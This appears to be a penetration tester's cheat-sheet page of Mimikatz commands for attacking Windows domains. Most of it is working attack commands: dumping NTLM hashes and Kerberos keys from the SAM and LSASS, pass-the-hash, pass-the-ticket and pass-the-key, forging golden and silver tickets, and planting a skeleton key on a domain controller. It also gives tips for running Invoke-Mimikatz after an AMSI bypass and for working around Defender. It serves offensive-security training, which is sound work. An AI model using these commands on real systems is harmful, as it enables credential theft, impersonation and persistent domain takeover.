# Using Mimikatz
Mimikatz needs to be run with administrative privileges (on the local machine), and provides its own command prompt. Use the `privilege::debug` command to check if you’re running with the right privileges.

## Pass the Hash
NTLM hashes in LSASS memory - NTLM hashes in the local SAM = NTLM hashes for domain users!

### Local SAM
This provides NTLM hashes for *local* users:

```
privilege::debug
token::elevate
lsadump::sam
```

### LSASS Memory
This provides NTLM hashes for *recently logged in* users:

```
privilege::debug
token::elevate
sekurlsa::msv
```

### Inject an NTLM Hash Into a Process
Commands (including reverse shells, if the necessary binaries/scripts are available) can be launched from Mimikatz using the extracted NTLM hash for authentication. Note that this *doesn’t* work if your privileges are elevated (weird, right?), hence the initial `token::revert` command:

```
token::revert
sekurlsa::pth /user:$TARGET_USER /domain:$TARGET_DOMAIN /ntlm:$TARGET_USER_NTLM_HASH /run:"$FULL_COMMAND_INCLUDING_ARGUMENTS"
```

The shell produced in this way is a bit weird, as it is actually running as the user that launched Mimikatz (which will show up if you call `whoami`, though the privileges will be those of the `$TARGET_USER`.

A number of Linux commands can also take NTLM hashes instead of passwords:

```bash
# XFreeRDP
#
xfreerdp /v:$TARGET_HOST \
         /u:$TARGET_DOMAIN\$TARGET_USER \
         /pth:$TARGET_USER_NTLM_HASH

# Psexec.py (but ONLY on Linux; this won’t work on Windows!)
#
psexec.py -hashes $TARGET_USER_NTLM_HASH \
                  $TARGET_DOMAIN\$TARGET_USER@$TARGET_HOST

# Evil-WinRM
#
evil-winrm -i $TARGET_HOST \
           -u $TARGET_USER \
           -H $TARGET_USER_NTLM_HASH
```

### Additional Resources
* [TryHackMe: Lateral Movement and Pivoting](https://tryhackme.com/room/lateralmovementandpivoting)

## Dumping Tickets
Mimikatz can dump ticket granting tickets (and session keys) from the memory of Windows’ Local Security Authority Subsystem Service (LSASS); these can then be used to for privilege elevation or lateral movement (depending on which users are active on that machine).

Use the `sekurlsa::tickets /export` command to dump any Kerberos “tickets” (really ticket + session key data structures) from LSASS’s memory as `.kirbi` files. Tickets are named like `ID-USER-SERVICE-DOMAIN.kirbi`; ticket granting tickets have a `krbtgt` SERVICE name. If you can find a `krbtgt` ticket belonging to an administrator account, then you’ve (almost) struck gold.

### Additional Resources
* [Kerberos](./Kerberos.md)

## Pass the Ticket Attacks
Mimikatz can extract Kerberos TGT/TGS tickets and session keys:

```
privilege::debug
sekurlsa::tickets /export
```

Note that TGTs for all users are available if you can run as SYSTEM; these allow TGS tickets to be requested for any service the corresponding user has access to. If you’re not running as SYSTEM, then you can get TGS tickets for the *current* user, which will give you access to those services the current user has permission to use (and has accessed recently).

Mimikatz can then inject tickets into the current session:

```
kerberos::ptt $KIRBI_FILENAME_FOR_TICKET_TO_INJECT
```

This allows the account you’re logged in as to (automatically!) “pass the ticket” and impersonate the user whose ticket you’ve harvested. The Windows built-in command `klist` will provide a list of currently active tickets.

### Additional Resources
* [TryHackMe: Lateral Movement and Pivoting](https://tryhackme.com/room/lateralmovementandpivoting)

## Pass the Key Attacks
“Pass the key” attacks rely on the fact that Kerberos TGTs are granted based on an encrypted timestamp, so if we can get access to these objects we can request TGTs as the corresponding user. Turns out that these also hang out in memory and can be extracted with Mimikatz:

```
privilege::debug
sekurlsa::ekeys
```

These keys can be injected into a command environment just like an NTLM hash, though you need to know how they’re encrypted. For example, for an AES256 encrypted key:

```
token::revert
sekurlsa::pth /user:$TARGET_USER /domain:$TARGET_DOMAIN /aes256:$TARGET_USER_KERBEROS_KEY /run:"$FULL_COMMAND_INCLUDING_ARGUMENTS"
```

Other options include `/aes128` and `/rc4` for those styles of encryption, though RC4 isn’t something that you’re likely to see as it’s weak and disabled by default. (Because of a historical quirk, the RC4 key is actually *not* a timestamp, but rather the user’s NTLM hash. So *iff* RC4 is enabled on a domain, then extracting a user’s NTLM hash is sufficient to request Kerberos TGTs as that user!)

### Additional Resources
* [TryHackMe: Lateral Movement and Pivoting](https://tryhackme.com/room/lateralmovementandpivoting)

## Golden/Silver Ticket Attacks
To generate a gold or silver ticket using Mimikatz, begin by running the `lsadump::lsa /inject /name:$SERVICE` command to retrieve the service SID and NTLM password hash for that service. If SERVICE is `krbtgt` then this will allow the creation of a golden ticket, otherwise you’ll be creating a silver ticket.

(You can also use a user name instead of `$SERVICE`, in which case it appears that Mimikatz will just request a ticket granting ticket from the KDC as that user in the next step; this is theoretically just as noisy as a golden ticket, but looks more “normal”.)

To actually create and cache the ticket, use `Kerberos::golden /user:$USER /domain:$DOMAIN /sid:$SID /krbtgt:$HASH /id:$TYPE`, where:

* `$USER` is the user to create the ticket for (probably the one you’ve compromised).
* `$DOMAIN` is the domain to create the ticket for.
* `$SID` is the SID of the service from the previous step.
* `$HASH` is the NT hash of the service password from the previous step.
* `$TYPE` is the type of Kerberos ticket to create; use 500 for a golden (ticket granting) ticket, and 1103 for a service ticket.

Once the ticket has been created, use `misc::cmd` to open a command prompt using the newly forged ticket.

### Additional Resources
* [Windows Password Hashes](./Windows%20Password%20Hashes.md)

## KDC Skeleton Key
If Mimikatz is run on a domain controller, it can modify the authentication service’s memory using the `misc::skeleton` command to cause it to attempt to decrypt the AS-REQ using *both* the user’s NT hash *and* an NT hash of your choosing (by default `60BA4FCADC466C7A033C178194C03DF6`, which is just `mimikatz`).  This means that you can send an AS-REQ as any user using the “skeleton key” hash to gain access as that user, similar to a golden ticket attack.

Obviously this isn’t very persistent itself, as the skeleton key will be lost if the server is rebooted or the authentication service restarted.

## Pure PowerShell Implementation
Mimikatz binaries are generally detected by AV on download these days, but fortunately there’s a PowerShell reimplementation available from the Empire Project that can be run after bypassing AMSI.

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"' > C:\mkat.txt
```

Note that Microsoft Defender will still detect the execution of Invoke-Mimikatz and kill the hosting PowerShell process. This is why we need to redirect the output to a file.

### Additional Resources
* [OffSec Live](https://www.offensive-security.com/offsec/offsec-live/)
* [EmpireProject / Empire / data / module_source / credentials / Invoke-Mimikatz.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1)
* [Using PowerShell](./Using%20PowerShell.md)
